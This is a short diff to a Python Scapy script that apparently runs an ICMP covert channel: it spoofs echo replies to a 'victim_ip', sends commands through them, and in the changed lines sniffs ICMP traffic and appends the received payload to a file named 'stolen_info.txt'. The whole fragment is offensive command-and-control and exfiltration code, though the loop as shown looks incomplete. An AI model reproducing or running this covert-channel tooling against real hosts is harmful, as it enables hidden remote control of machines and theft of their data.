@@ -31,7 +31,7 @@ def IsActive(packet):
         time.sleep(0.3)
         send( IP(src=packet[IP].dst, dst=victim_ip)
             / ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
-            / "reply" )
+            / "" )
         
 
 def sendCommand(usr_cmd, packet):
@@ -47,9 +47,10 @@ def sendCommand(usr_cmd, packet):
         packet = sniff(iface=my_iface, filter="icmp", count=1)
 
     while payload != 'end':
-        send( IP(src=packet[IP].dst, dst=victim_ip)
-        / ICMP(type=0, id=packet[0][ICMP].id, seq=packet[0][ICMP].seq)
-        /"moreplz")
+        packet = sniff(iface=my_iface, filter="icmp")
+        with open("stolen_info.txt","a") as file:
+            file.write(payload)
+       
 
          
 
